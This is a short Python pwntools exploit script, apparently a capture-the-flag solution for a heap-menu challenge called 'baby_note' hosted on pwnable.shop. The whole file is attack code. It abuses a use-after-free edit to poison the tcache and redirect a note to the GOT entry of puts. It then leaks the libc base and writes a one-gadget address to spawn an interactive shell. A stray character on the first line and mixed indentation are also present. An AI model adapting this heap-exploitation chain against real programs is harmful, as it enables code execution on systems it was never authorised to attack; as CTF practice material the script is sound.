c

#p = process('./campnote')
p = remote("pwnable.shop", 20205)
e = ELF('./baby_note')
l = ELF('/home/youngsouk/pwn/libc-database/db/libc6_2.29-0ubuntu2_amd64.so')

context.log_level="debug"

def malloc(size, content):
        p.sendlineafter('>>','1')
        p.sendlineafter('size >> ',str(size))
        p.sendlineafter('data >> ',str(content))

def free(index):
        p.sendlineafter('>>','2')
        p.sendlineafter('index >> ', str(index))

def view(index):
        p.sendlineafter('>>','3')
        p.sendlineafter('index >> ', str(index))

def edit(index,size,content):
	p.sendlineafter('>>','4')
        p.sendlineafter('index >> ', str(index))
	p.sendlineafter('size >> ', str(size))
	p.sendlineafter('data >> ',content)

size = 256
malloc(size,0)
malloc(700,1)
malloc(size,1)

free(0)

edit(0, 10, p64(0x4040C0))
malloc(size, 4)
malloc(size, p64(e.got['puts']))
view(0)

p.recvuntil('data >> ')
libc = u64(p.recv(6).ljust(8,'\x00')) - l.sym['puts']
log.info('libc : ' + hex(libc))

edit(0,10,p64(libc + 0x106ef8))

p.interactive()
